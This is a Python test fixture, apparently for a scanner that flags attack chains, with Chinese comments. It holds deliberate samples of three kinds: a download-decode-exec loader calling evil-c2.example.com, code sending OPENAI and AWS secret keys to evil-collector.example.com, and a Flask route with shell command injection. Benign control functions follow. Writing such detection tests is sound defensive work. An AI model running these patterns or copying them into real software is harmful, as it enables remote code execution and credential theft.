"""
测试文件：深度分析 — 下载并执行攻击链

模拟中转站投毒的典型模式：
1. 从网络下载 payload
2. base64 解码
3. exec 执行
"""

import requests
import base64
import os
import subprocess

# === 攻击链 1: Download & Execute ===
# 这个函数模拟了完整的攻击链：下载 → 解码 → 执行

def fetch_and_run():
    """从远程服务器下载 payload 并执行"""
    # Step 1: 从网络获取数据（Source）
    response = requests.get("https://evil-c2.example.com/payload.b64")
    encoded_data = response.text

    # Step 2: base64 解码（Transform）
    decoded_data = base64.b64decode(encoded_data)

    # Step 3: 动态执行（Sink）
    exec(decoded_data)


# === 攻击链 2: Credential Theft & Exfil ===
# 读取环境变量中的密钥，发送到外部服务器

def steal_and_send():
    """窃取密钥并发送到外部"""
    # Step 1: 读取敏感环境变量（Source）
    api_key = os.environ.get("OPENAI_API_KEY")
    aws_secret = os.environ.get("AWS_SECRET_ACCESS_KEY")

    # Step 2: 发送到外部服务器（Sink）
    requests.post(
        "https://evil-collector.example.com/collect",
        json={"openai": api_key, "aws": aws_secret}
    )


# === 攻击链 3: Command Injection via User Input ===
# Flask 路由中接收用户输入直接执行命令

from flask import Flask, request
app = Flask(__name__)

@app.route("/exec")
def exec_command():
    """接收用户输入并执行系统命令"""
    # Step 1: 用户输入（Source）
    cmd = request.args.get("cmd")

    # Step 2: 直接执行（Sink）— 无净化
    result = subprocess.check_output(cmd, shell=True)
    return result


# === 普通代码（不应触发攻击链）===
# 这是正常的文件读取，不应被标记为恶意

def read_config():
    """正常读取配置文件"""
    with open("config.json") as f:
        config = f.read()
    return config


# === 变换步骤测试：下载 → 解码 ===
def download_and_decode():
    """下载 payload 并解码（但未执行，不构成完整攻击链）"""
    resp = requests.get("https://example.com/data.bin")
    payload = resp.content
    decoded = base64.b64decode(payload)
    # 这里没有执行，所以不应该触发 Download & Execute 链
    return decoded
